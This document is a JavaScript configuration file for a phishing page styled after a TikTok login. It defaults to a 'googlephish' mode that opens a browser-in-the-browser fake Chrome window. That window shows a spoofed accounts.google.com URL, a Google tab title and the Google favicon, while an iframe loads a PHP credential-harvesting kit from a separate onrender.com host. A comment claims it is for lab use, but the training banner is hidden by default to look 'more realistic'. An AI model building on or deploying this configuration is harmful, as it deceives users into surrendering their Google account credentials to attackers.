window.APP_CONFIG = {
    /**
     * Login backend for the TikTok-style page:
     * - "api" — JSON API (apiBaseUrl) + real Google Sign-In
     * - "googlephish" — BITB modal iframe → PHP googlephish kit (lab / training only)
     */
    /** Use "googlephish" to open the simulated Chrome window (BITB) below. */
    authMode: 'googlephish',

    apiBaseUrl: 'https://tk-ap.onrender.com',
    googleClientId: '735055798027-6jjv31ohc5eg03olqn9i8tvav311j34l.apps.googleusercontent.com',
    authPollIntervalMs: 1500,
    authPollMaxMs: 3 * 60 * 1000,
    afterLoginRedirectUrl: 'https://www.google.com',
    afterLoginRedirectDelayMs: 0,

    /** Deployed PHP app (no trailing slash). Iframe loads {base}{bitbEntryPath}. */
    googlephishBaseUrl: 'https://tk-ap-1.onrender.com',

    /** First path under googlephishBaseUrl (default sign-in page). */
    bitbEntryPath: '/index.php',

    /**
     * Shown in the fake omnibox (Chrome-style). Use a plausible accounts.google.com URL;
     * the iframe still loads your Render host above.
     */
    bitbDisplayUrl:
        'https://accounts.google.com/v3/signin/identifier?flowName=GlifWebSignIn&flowEntry=ServiceLogin&dsh=S-1:1234567890',

    /** Fake tab / window title (Chrome default for this flow). */
    bitbTabTitle: 'Sign in - Google Accounts',

    /** Favicon in the fake tab (Google favicon reads well in most browsers). */
    bitbFaviconUrl: 'https://www.google.com/favicon.ico',

    /**
     * Optional banner in the titlebar (empty string = hidden, more realistic).
     * Set e.g. "Lab" only when you want an obvious training marker.
     */
    bitbLabLabel: ''
};
